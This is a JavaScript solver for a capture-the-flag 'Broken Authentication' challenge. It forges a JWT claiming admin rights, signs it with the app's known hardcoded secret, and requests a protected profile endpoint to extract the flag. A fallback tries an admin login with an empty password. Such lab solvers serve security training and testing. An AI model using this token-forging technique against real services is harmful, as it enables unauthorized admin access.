/**
 * Challenge: 0xa2 - Broken Authentication
 * Exploit: Create JWT with isAdmin=true using known secret 'secret123'
 */

const jwt = require('jsonwebtoken');
const { createLogger, httpRequest, extractFlag } = require('../utils');

async function run(token, baseUrl, testUser, testPass) {
    const { log, saveFlag } = createLogger('0xa2');
    log('Starting 0xa2 exploit: Broken Authentication');

    // JWT secret is hardcoded as 'secret123' in auth.js
    const JWT_SECRET = 'secret123';

    // Try to decode the existing token to get user info
    let decoded;
    try {
        decoded = jwt.decode(token);
        log(`Decoded token: ${JSON.stringify(decoded)}`);
    } catch (error) {
        log(`Error decoding token: ${error.message}`);
    }

    // Create a new JWT with isAdmin=true
    if (decoded) {
        const adminPayload = {
            userId: decoded.userId || decoded.id,
            username: decoded.username || testUser,
            isAdmin: 'true', // Must be string 'true' as per auth.js
        };

        log('Creating JWT with isAdmin=true...');
        const adminToken = jwt.sign(adminPayload, JWT_SECRET);

        // Try to access profile with admin token
        const result = await httpRequest(`${baseUrl}/api/profile`, {
            method: 'GET',
            headers: {
                'Authorization': `Bearer ${adminToken}`,
            },
        });

        log(`Response: ${JSON.stringify(result.data)}`);

        // Check if flag is in response
        const flag = extractFlag(JSON.stringify(result.data));
        if (flag) {
            saveFlag(flag);
            return { success: true, flag };
        }

        // The flag should be returned when isAdmin=true in verifyToken middleware
        if (result.data && result.data.flag) {
            saveFlag(result.data.flag);
            return { success: true, flag: result.data.flag };
        }

        log('⚠️  Admin token created but flag not found in response');
        log('   This may require accessing a different endpoint');
    } else {
        log('⚠️  Could not decode token, trying alternative approach');
        
        // Try to login as admin (though password is random)
        const loginResult = await httpRequest(`${baseUrl}/api/login`, {
            method: 'POST',
            body: JSON.stringify({
                username: 'admin',
                password: '',
            }),
        });

        const flag = extractFlag(JSON.stringify(loginResult.data));
        if (flag) {
            saveFlag(flag);
            return { success: true, flag };
        }
    }

    return { success: false };
}

module.exports = { run };
